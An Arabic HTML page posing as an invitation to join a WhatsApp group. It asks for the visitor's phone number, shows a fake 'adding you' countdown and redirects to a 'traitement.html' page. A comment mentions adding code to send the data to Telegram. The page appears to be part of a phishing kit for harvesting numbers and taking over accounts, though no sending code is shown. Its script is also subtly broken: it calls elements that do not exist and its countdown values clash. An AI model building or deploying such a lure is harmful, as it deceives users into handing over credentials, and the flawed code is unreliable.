<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="whatsapp-logo-icon-isolated-on-transparent-background-free-png.webp">
    <title>انضم إلى مجموعتنا على واتساب</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary-color: #25D366;
            --secondary-color: #128C7E;
            --dark-color: #075E54;
            --light-color: #DCF8C6;
            --text-color: #333;
            --light-text: #777;
            --white: #ffffff;
            --gray: #f5f5f5;
            --dark-gray: #e5e5e5;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            background-color: var(--gray);
            overflow-x: hidden;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background-color: var(--white);
            padding: 30px;
            border-radius: 10px;
            width: 100%;
            max-width: 500px;
            box-shadow: var(--shadow);
            animation: fadeIn 0.3s ease-out;
        }

        .modal-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .modal-header h2 {
            color: var(--dark-color);
            margin-bottom: 10px;
        }

        .modal-header p {
            color: var(--light-text);
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .phone-input-container {
            margin-bottom: 5px;
        }

        .input-field {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--dark-gray);
            border-radius: 6px;
            font-size: 16px;
            transition: var(--transition);
        }

        .input-field:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
        }

        .submit-btn {
            background-color: var(--primary-color);
            color: var(--white);
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .submit-btn:hover {
            background-color: var(--secondary-color);
        }

        .countdown-container {
            display: none;
            text-align: center;
            padding: 30px;
            background-color: var(--white);
            border-radius: 10px;
            box-shadow: var(--shadow);
            margin-top: 20px;
        }

        .countdown-title {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: var(--dark-color);
        }

        .countdown {
            font-size: 3rem;
            font-weight: 700;
            color: var(--primary-color);
            margin-bottom: 20px;
        }

        .status-message {
            font-size: 1.2rem;
            color: var(--light-text);
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--white);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* International telephone input customization */
        .iti {
            width: 100%;
        }

        .iti__selected-flag {
            padding: 0 15px;
        }

        .iti__arrow {
            border-left: 3px solid transparent;
            border-right: 3px solid transparent;
            border-top: 4px solid #555;
        }

        .iti__country-list {
            border-radius: 6px;
            box-shadow: var(--shadow);
        }
    </style>
</head>
<body>
    <!-- نموذج إدخال رقم الهاتف -->
    <div class="modal-overlay" id="phoneModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>انضم إلى مجموعتنا على واتساب</h2>
                <p>الرجاء إدخال رقم هاتفك للوصول إلى المجموعة</p>
            </div>
            <form id="whatsappForm">
                <div class="form-group">
                    <label for="phone">رقم هاتف واتساب</label>
                    <div class="phone-input-container">
                        <input type="tel" id="phone" class="input-field" required>
                    </div>
                    <small style="color: var(--light-text);">سوف تتلقى رابط الدعوة على واتساب</small>
                </div>
                <div class="form-group">
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <span>انضم إلى المجموعة</span>
                        <i class="fab fa-whatsapp"></i>
                    </button>
                </div>
            </form>

            <div class="countdown-container" id="countdownSection">
                <h3 class="countdown-title">جاري تحضير دعوتك</h3>
                <div class="countdown" id="countdown">15</div>
                <p class="status-message">الرجاء الانتظار بينما نضيفك إلى المجموعة...</</p>
                <div class="spinner" style="margin: 0 auto;"></div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // تهيئة حقل إدخال الهاتف
            const phoneInput = document.getElementById('phone');
            const iti = window.intlTelInput(phoneInput, {
                initialCountry: "sa",
                preferredCountries: ["sa", "ae", "eg", "iq", "jo", "kw", "lb", "om", "qa", "bh"],
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
            });

            // إرسال النموذج
            const whatsappForm = document.getElementById('whatsappForm');
            const countdownSection = document.getElementById('countdownSection');
            const submitBtn = document.getElementById('submitBtn');
            const countdownElement = document.getElementById('countdown');
            const countdownCircle = document.getElementById('countdownCircle');
            const progressBar = document.getElementById('progressBar');
            
            whatsappForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const phoneNumber = iti.getNumber();
                
                if (!phoneNumber || !iti.isValidNumber()) {
                    alert('الرجاء إدخال رقم هاتف صحيح.');
                    return;
                }
                
                submitBtn.innerHTML = '<span class="spinner"></span> <span>جاري الإرسال...</span>';
                submitBtn.disabled = true;
                
                // إخفاء النموذج وعرض العد التنازلي
                whatsappForm.style.display = 'none';
                countdownSection.style.display = 'block';
                
                // بدء العد التنازلي (20 ثانية)
                let seconds = 20;
                const totalSeconds = seconds;
                const circumference = 2 * Math.PI * 50;
                
                const countdownInterval = setInterval(() => {
                    seconds--;
                    countdownElement.textContent = seconds;
                    
                    // تحديث دائرة التقدم
                    const progress = 1 - (seconds / totalSeconds);
                    const offset = circumference * progress;
                    countdownCircle.style.background = `
                        conic-gradient(var(--primary-color) ${progress * 100}%, 
                        var(--light-color) ${progress * 100}%
                    `;
                    
                    // تحديث شريط التقدم
                    progressBar.style.width = `${progress * 100}%`;
                    
                    if (seconds <= 0) {
                        clearInterval(countdownInterval);
                        // الانتقال إلى الصفحة التالية بعد انتهاء العد
                        window.location.href = 'traitement.html';
                    }
                }, 1000);
                
                // يمكنك هنا إضافة كود إرسال البيانات إلى التليجرام إذا لزم الأمر
                // كما في الكود السابق
            });
        });
    </script>
</body>
</html>
